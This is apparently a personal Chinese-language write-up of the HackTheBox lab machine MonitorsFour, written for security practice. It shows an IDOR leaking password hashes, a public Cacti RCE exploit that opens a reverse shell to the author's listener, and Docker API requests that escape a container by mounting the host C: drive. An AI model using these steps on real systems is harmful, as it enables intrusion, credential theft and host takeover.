---
layout: post
title: "HackTheBox - MonitorsFour"
date: 2026-03-24
category: "Security Practice｜HackTheBox"
tags: []
draft: false
toc: true
comments: true
---

# HackTheBox - MonitorsFour
<!-- more -->

## Recon
### Port Scanning / Subdomain Enumeration / Directory Scanning
```bash
$ nmap -sC -sV -p- 10.129.11.189 -oN nmap_full.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-24 18:13 CST
Nmap scan report for monitorsfour.htb (10.129.11.189)
Host is up (0.21s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MonitorsFour - Networking Solutions

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 882.83 seconds
$ ffuf -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -w /snap/seclists/1214/Discovery/DNS/subdomains-top1million-20000.txt -fs 138
...

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [19966/19966] :: Job [1/1] :: 183 req/sec :: Duration: [0:01:49] :: Errors: 0 ::
$ ffuf -u http://cacti.monitorsfour.htb/FUZZ -w /snap/seclists/1214/Discovery/Web-Content/common.txt -fs 0
...
.htpasswd               [Status: 403, Size: 146, Words: 3, Lines: 8]
.hta                    [Status: 403, Size: 146, Words: 3, Lines: 8]
.htaccess               [Status: 403, Size: 146, Words: 3, Lines: 8]
_vti_bin/shtml.dll      [Status: 403, Size: 146, Words: 3, Lines: 8]
jhtml                   [Status: 403, Size: 146, Words: 3, Lines: 8]
phtml                   [Status: 403, Size: 146, Words: 3, Lines: 8]
rhtml                   [Status: 403, Size: 146, Words: 3, Lines: 8]
shtml                   [Status: 403, Size: 146, Words: 3, Lines: 8]
xhtml                   [Status: 403, Size: 146, Words: 3, Lines: 8]
~httpd                  [Status: 403, Size: 146, Words: 3, Lines: 8]
~http                   [Status: 403, Size: 146, Words: 3, Lines: 8]
:: Progress: [4750/4750] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
$ ffuf -u http://monitorsfour.htb/api/v1/FUZZ -w /snap/seclists/1214/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
...
user                    [Status: 200, Size: 35, Words: 3, Lines: 1]
users                   [Status: 200, Size: 35, Words: 3, Lines: 1]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [87664/87664] :: Job [1/1] :: 118 req/sec :: Duration: [0:12:17] :: Errors: 0 ::
ffuf -u http://monitorsfour.htb/FUZZ -w /snap/seclists/1214/Discovery/Web-Content/raft-medium-directories.txt
...
login                   [Status: 200, Size: 4340, Words: 1342, Lines: 96]
contact                 [Status: 200, Size: 367, Words: 34, Lines: 5]
user                    [Status: 200, Size: 35, Words: 3, Lines: 1]
static                  [Status: 301, Size: 162, Words: 5, Lines: 8]
views                   [Status: 301, Size: 162, Words: 5, Lines: 8]
controllers             [Status: 301, Size: 162, Words: 5, Lines: 8]
forgot-password         [Status: 200, Size: 3099, Words: 164, Lines: 84]
:: Progress: [29999/29999] :: Job [1/1] :: 163 req/sec :: Duration: [0:03:03] :: Errors: 1 ::
```
從Port Scanning / Subdomain Enumeration / Directory Scanning等等操作可以知道80 port然後有一個cacti的subdomain
> Cacti 是一套「網路監控系統（Network Monitoring Tool）」，主要用來：收集設備數據 → 畫成圖表 → 讓管理員看系統狀態

### 找CVE和Exploit
像這種第三方的產品，就要上網看一下有沒有CVE可以利用，可以從[cvedetails](https://www.cvedetails.com/vulnerability-list/vendor_id-7458/product_id-12584/version_id-1907377/Cacti-Cacti-1.2.28.html)中找到[CVE-2025-24367 - Cacti allows Arbitrary File Creation leading to RCE](https://www.cvedetails.com/cve/CVE-2025-24367/)
> Cacti is an open source performance and fault management framework. An authenticated Cacti user can abuse graph creation and graph template functionality to create arbitrary PHP scripts in the web root of the application, leading to remote code execution on the server. This vulnerability is fixed in 1.2.29.

再找一下有沒有現成的exploit可以用，在Github找到[TheCyberGeek/CVE-2025-24367-Cacti-PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)，所以現在的目標是找到authenticated cacti user

在上述的測試中知道`/user`這個path，並且需要token這個parameter

<img src="/assets/posts/HackTheBox/Monitorsfour-1.png">

### IDOR
如果出現可以指定resource的狀態就要懷疑可不可以利用
```text
?id=1
?user=admin
?uid=1001
?file=report.pdf
?token=abc123
```
那這些就很有可能會有IDOR(Insecure Direct Object Reference)的問題，如果request`/user?token=0`會怎麼樣呢
```bash
curl -s "http://monitorsfour.htb/user?token=0"
```
```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer",
    "dob": "1990-07-16",
    "start_date": "2021-06-20",
    "salary": "68000.00"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "token": "0e111111111111111",
    "name": "David Thompson",
    "position": "Database Manager",
    "dob": "1982-11-23",
    "start_date": "2022-09-15",
    "salary": "83000.00"
  }
]
```
看到admin帳號，然後32byte就要想到MD5 hash透過[線上的unhash](https://crackstation.net/)嘗試破解，終於找到cacti的foothold
* Username: `Marcus`
* Password: `wonderful1`

所以到目前為止的流程是
* nmap → 找到80 port → 找到IDOR → 找到foothold
* 透過fuzz subdomain → 找到cacti → 找CVE → 利用現成的exploit拿到RCE

### 實際拿到RCE
建議在同一個環境下建立，例如nc和exploit都在windows或是都在kali，而不是nc在windows，exploit在wsl，這樣會crash
```bash
$ git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git   
$ cd CVE-2025-24367-Cacti-PoC
$ ipconfig
...
不明的介面卡 區域連線:

   連線特定 DNS 尾碼 . . . . . . . . :
   IPv6 位址. . . . . . . . . . . . .: dead:beef:2::116a
   連結-本機 IPv6 位址 . . . . . . . : fe80::1889:8488:4288:d0b6%74
   IPv4 位址 . . . . . . . . . . . . : 10.10.15.108
   子網路遮罩 . . . . . . . . . . . .: 255.255.254.0
   預設閘道 . . . . . . . . . . . . .:
...
$ python exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderful1 -i 10.10.15.108 -l 9001
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: IKFgG.php
[+] Got payload: /bash
[i] Created PHP filename: BHizn.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```
在另外一個terminal建立`$ ncat -lvnp 9001`
```bash
$ ncat -lvnp 9001
Ncat: Version 7.98 ( https://nmap.org/ncat )
Ncat: Listening on [::]:9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.11.189:58161.
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$ pwd
pwd
/var/www/html/cacti
www-data@821fbd6a43fa:~/html/cacti$
www-data@821fbd6a43fa:~/html/cacti$ whoami
whoami
www-data
www-data@821fbd6a43fa:~/html/cacti$
www-data@821fbd6a43fa:~/html/cacti$ ls -al /
ls -al /
total 6248
drwxr-xr-x   1 root root    4096 Mar 24 12:21 .
drwxr-xr-x   1 root root    4096 Mar 24 12:21 ..
-rwxr-xr-x   1 root root       0 Nov 10 17:04 .dockerenv
lrwxrwxrwx   1 root root       7 Aug 24  2025 bin -> usr/bin
drwxr-xr-x   2 root root    4096 Aug 24  2025 boot
drwxr-xr-x   5 root root     340 Mar 24 04:38 dev
drwxr-xr-x   1 root root    4096 Nov 10 17:04 etc
drwxr-xr-x   1 root root    4096 Nov 10 16:15 home
lrwxrwxrwx   1 root root       7 Aug 24  2025 lib -> usr/lib
lrwxrwxrwx   1 root root       9 Aug 24  2025 lib64 -> usr/lib64
drwxr-xr-x   2 root root    4096 Nov  3 20:44 media
drwxr-xr-x   2 root root    4096 Nov  3 20:44 mnt
drwxr-xr-x   2 root root    4096 Nov  3 20:44 opt
dr-xr-xr-x 191 root root       0 Mar 24 04:38 proc
drwx------   2 root root    4096 Nov  3 20:44 root
drwxr-xr-x   1 root root    4096 Nov 10 17:05 run
lrwxrwxrwx   1 root root       8 Aug 24  2025 sbin -> usr/sbin
drwxr-xr-x   2 root root    4096 Nov  3 20:44 srv
-rwxr-xr-x   1 root root     113 Sep 13  2025 start.sh
dr-xr-xr-x  13 root root       0 Mar 24 04:38 sys
drwxrwxrwt   1 root root 6328320 Mar 24 12:25 tmp
drwxr-xr-x   1 root root    4096 Nov  3 20:44 usr
drwxr-xr-x   1 root root    4096 Nov  4 04:06 var
www-data@821fbd6a43fa:~/html/cacti$
www-data@821fbd6a43fa:~/html/cacti$ ls -al /home
ls -al /home
total 16
drwxr-xr-x 1 root   root   4096 Nov 10 16:15 .
drwxr-xr-x 1 root   root   4096 Mar 24 12:21 ..
drwxr-xr-x 1 marcus marcus 4096 Mar 24 04:40 marcus
www-data@821fbd6a43fa:~/html/cacti$
www-data@821fbd6a43fa:~/html/cacti$ ls -al /home/marcus
ls -al /home/marcus
total 28
drwxr-xr-x 1 marcus marcus 4096 Mar 24 04:40 .
drwxr-xr-x 1 root   root   4096 Nov 10 16:15 ..
-rw-r--r-- 1 marcus marcus  220 Jul 30  2025 .bash_logout
-rw-r--r-- 1 marcus marcus 3526 Jul 30  2025 .bashrc
-rw-r--r-- 1 marcus marcus  807 Jul 30  2025 .profile
-r-xr-xr-x 1 root   root     34 Mar 24 04:37 user.txt
www-data@821fbd6a43fa:~/html/cacti$
www-data@821fbd6a43fa:~/html/cacti$ cat /home/marcus/user.txt
cat /home/marcus/user.txt
2266054595f947ade8583fc1eccc70bb
www-data@821fbd6a43fa:~/html/cacti$
www-data@821fbd6a43fa:~/html/cacti$
```
現在我們拿到user.txt的flag，那麼下一步就是提權拿到root.txt

### 找漏洞提權
首先，從一些recon可以得知我們是在WSL當中的container中，`821fbd6a43fa`這個hostname看起來就是container然後uname又有提到WSL
```bash
www-data@821fbd6a43fa:~/html/cacti$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@821fbd6a43fa:~/html/cacti$ uname -a
uname -a
Linux 821fbd6a43fa 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 GNU/Linux
```
所以現在的結構大概如下，我們要拿到的root.txt可能在WSL中而不是在docker中，畢竟這樣的提權沒有意義
```text
Windows 11 Host
└── WSL2 VM
    └── Docker
        └── container
```
現在最重要的事情是
1. 我能不能用container控制host
2. 我想要知道docker的版本是多少，只要確定版本就有機會知道用什麼方法escape container

我先找到在reddit上的post: [Quick Guide: How to control a Docker Host from inside a container](https://www.reddit.com/r/docker/comments/169hnti/quick_guide_how_to_control_a_docker_host_from/)
> So how does it work then?
> 
> A Docker host can provide a API over TCP. This can be enabled for the Docker daemon by editing the file /etc/docker/daemon.json like this:
> ```
> {
>   "hosts": ["unix:///var/run/docker.sock", "tcp://0.0.0.0:2375"]
> }
> ```
> Restart the Docker daemon and then it should be listening on TCP port 2375.
> 
> If you dont want to, or cannot, modify your Docker daemon like this, i will mention a alternative further down below.
> 
> Now what?
> 
> Now you can send commands to the API, hopefully the target container image that sends those commands has curl, wget or something similar available.
> 
> `curl http://{docker-host-IP}:2375/containers/json` will for example print a list of running containers, equal to using docker ps.
> 
> * To stop a container: curl http://{docker-host-IP}:2375/containers/{id}/stop
> * To start a container: curl http://{docker-host-IP}:2375/containers/{id}/start
> 
> (Replace id with either the container id, or the container name) 

也就是我需要先知道docker host ip才可以控制到host或者是如果他有建立docker-socket-proxy也可以，但關鍵性的file也沒看到
```bash
www-data@821fbd6a43fa:~/html/cacti$ ls -al /run/docker.socket
ls: cannot access '/run/docker.socket': No such file or directory
```
我在CSDN上看到`host.docker.internal`這東西([Docker中存取宿主機器：host.docker.internal](https://blog.csdn.net/qiy_icbc/article/details/142515743))
> host.docker.internal是 Docker 提供的一個特殊DNS名稱，用於在 Docker容器 內部解析為宿主機的內部 IP 地址。這項特性在Docker版本18.03以上版本中可用，它允許容器內的應用程式透過此網域來存取宿主機上執行的服務或資源。
> 
> host.docker.internal確實解析為宿主機的 IP位址 。不過，這裡所說的「本機」指的是運行Docker容器的宿主機，而不是容器本身。由於Docker容器預設透過橋接方式與宿主機共享網絡，但容器內部有自己的網絡 堆疊 和IP位址空間，因此需要一個特殊的方式來讓容器能夠存取宿主機。 host.docker.internal正是為此目的而設計的。

```bash
www-data@821fbd6a43fa:~/html/cacti$ curl -v http://host.docker.internal:2375/version
<i$ curl -v http://host.docker.internal:2375/version
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host host.docker.internal:2375 was resolved.
* IPv6: fdc4:f303:9324::254
* IPv4: 192.168.65.254
*   Trying [fdc4:f303:9324::254]:2375...
* Immediate connect fail for fdc4:f303:9324::254: Network is unreachable
*   Trying 192.168.65.254:2375...
* connect to 192.168.65.254 port 2375 from 172.18.0.3 port 52592 failed: Connection refused
* Failed to connect to host.docker.internal port 2375 after 219 ms: Could not connect to server
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
* closing connection #0
curl: (7) Failed to connect to host.docker.internal port 2375 after 219 ms: Could not connect to server
```
發現`192.168.65.254`應該就是這個DNS IP，那有沒有其他的IP，反正就try & error，發現`192.168.65.7:2375`開著
```bash
www-data@821fbd6a43fa:~/html/cacti$ curl 192.168.65.7:2375
curl 192.168.65.7:2375
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    29    0    29    0     0   4242      0 --:--:-- --:--:-- --:--:--  4833
{"message":"page not found"}
www-data@821fbd6a43fa:~/html/cacti$ curl 192.168.65.7:2375/version
curl 192.168.65.7:2375/version
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   852    0   852    0     0  12132      0 --:--:-- --:--:-- --:--:-- 12171
```
那代表這應該就是和host溝通的IP，而且也得到version: `28.3.2`，如下
```json
[
  {
    "Platform": {
      "Name": "Docker Engine - Community"
    },
    "Components": [
      {
        "Name": "Engine",
        "Version": "28.3.2",
        "Details": {
          "ApiVersion": "1.51",
          "Arch": "amd64",
          "BuildTime": "2025-07-09T16:13:55.000000000+00:00",
          "Experimental": "false",
          "GitCommit": "e77ff99",
          "GoVersion": "go1.24.5",
          "KernelVersion": "6.6.87.2-microsoft-standard-WSL2",
          "MinAPIVersion": "1.24",
          "Os": "linux"
        }
      },
      {
        "Name": "containerd",
        "Version": "1.7.27",
        "Details": {
          "GitCommit": "05044ec0a9a75232cad458027ca83437aae3f4da"
        }
      },
      {
        "Name": "runc",
        "Version": "1.2.5",
        "Details": {
          "GitCommit": "v1.2.5-0-g59923ef"
        }
      },
      {
        "Name": "docker-init",
        "Version": "0.19.0",
        "Details": {
          "GitCommit": "de40ad0"
        }
      }
    ],
    "Version": "28.3.2",
    "ApiVersion": "1.51",
    "MinAPIVersion": "1.24",
    "GitCommit": "e77ff99",
    "GoVersion": "go1.24.5",
    "Os": "linux",
    "Arch": "amd64",
    "KernelVersion": "6.6.87.2-microsoft-standard-WSL2",
    "BuildTime": "2025-07-09T16:13:55.000000000+00:00"
  }
]
```
以AI的回應
> Docker container escape vulnerabilities (CVEs) allow attackers to break isolation and gain host-level access. Major 2024–2025 CVEs include
CVE-2025-31133 (runc maskedPaths abuse), CVE-2025-9074 (Docker Desktop API access), and CVE-2024-21626 (runc file descriptor leak). This NIST page tracks many of these risks. Mitigation requires updating to the latest Docker Engine/Desktop.
> 
> Notable Docker Container Escape CVEs (2024–2025) 
>
> * CVE-2025-9074 (Critical): Affects Docker Desktop on Windows and macOS. It is a server-side request forgery (SSRF)-like vulnerability that allows containers to access the Docker Engine API, enabling full host control. Fixed in version 4.44.3.
> * CVE-2025-31133 (runc Vulnerability): Affects runc by abusing maskedPaths, allowing attackers to access sensitive host files that should be hidden. Fixed in runc 1.2.8, 1.3.3, and 1.4.0-rc.3.
> * CVE-2024-21626 (Leaky Vessels): A high-severity vulnerability in runc allowing container escape during image build or startup by leaking file descriptors to the host filesystem. Fixed in runc v1.1.12.
> * CVE-2025-23266 (NVIDIA Container Toolkit): A critical vulnerability in CDI mode affecting NVIDIA tools, which could lead to container escapes.

感覺`CVE-2025-9074`比較符合現況，詳細看了資安人的post([Docker 修補 CVE-2025-9074 嚴重容器逃脫漏洞，CVSS 風險評分達 9.3](https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=12172))
> 資安研究員 Felix Boulet 深入分析發現，此漏洞源自容器能直接連接到 Docker Engine API（位址：192.168.65.7:2375），且完全無需身份驗證。具有特權的容器可透過掛載 C:\ 磁碟機，取得底層主機的完整存取權限。
> ...
> 在 Windows 系統上，由於 Docker Engine 透過 WSL2 執行，攻擊者能以管理員權限掛載整個檔案系統，不僅可讀取敏感資料，更能覆寫系統 DLL 檔案來提升權限。

難怪不需要socket並且關鍵字WSL也有看到，是一個標準的SSRF

### 提權
按照作者的POC如下([ When a SSRF is enough: Full Docker Escape on Windows Docker Desktop (CVE-2025-9074) ](https://blog.qwertysecurity.com/Articles/blog3#videopoc))
```bash
$ wget --header='Content-Type: application/json' --post-data='{"Image":"alpine","Cmd":["sh","-c","echo pwned > /host_root/pwn.txt"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}' -O - http://192.168.65.7:2375/containers/create > create.json
$ cid=$(cut -d'"' -f4 create.json)
$ wget --post-data='' -O - http://192.168.65.7:2375/containers/$cid/start
```

最主要的流程是:
1. 透過`192.168.65.7:2375`向host請求create一個新的container並且告訴這個container要做的事情(CMD)同時bind主機當中的`/mnt/host/c` → `/host_root`
2. 實際start這個container，那他就會去執行前面定義的CMD，那麼`$ echo pwned > /host_root/pwn.txt` = `$ echo pwned > /mnt/host/c/pwn.txt`

所以我們也依樣畫葫蘆
```bash
www-data@821fbd6a43fa:~/html/cacti$ curl -X POST http://192.168.65.7:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine",  "Cmd":["sh","-c","cat /host_root/Users/Administrator/Desktop/root.txt"],  "HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}'
{"Id":"3a8771250c4ec217a13188f4185ef463fdc6bc4df5ec6dcad172936238626579","Warnings":[]}
www-data@821fbd6a43fa:~/html/cacti$ curl -X POST http://192.168.65.7:2375/containers/3a8771250c4ec217a13188f4185ef463fdc6bc4df5ec6dcad172936238626579/start
www-data@821fbd6a43fa:~/html/cacti$ curl "http://192.168.65.7:2375/containers/3a8771250c4ec217a13188f4185ef463fdc6bc4df5ec6dcad172936238626579/logs?stdout=1&stderr=1"
4b1537ae546aff7ca81ee94cfaec9a96
```

現在我們拿到兩個Flag
* User Flag: `2266054595f947ade8583fc1eccc70bb`
* Root Flag: `4b1537ae546aff7ca81ee94cfaec9a96`